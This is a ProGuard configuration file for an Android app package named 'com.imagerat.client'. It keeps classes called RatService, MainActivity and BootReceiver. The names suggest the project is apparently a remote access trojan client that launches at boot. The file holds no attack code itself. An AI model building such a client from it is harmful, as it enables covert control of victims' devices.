# Add project specific ProGuard rules here.
# By default, the flags in this file are appended to flags specified
# in /usr/local/android-sdk/tools/proguard/proguard-android.txt

# Keep the RatService and MainActivity so they are not removed during optimization
-keep class com.imagerat.client.RatService { *; }
-keep class com.imagerat.client.MainActivity { *; }
-keep class com.imagerat.client.BootReceiver { *; }

# Keep all classes in the package
-keep class com.imagerat.client.** { *; }

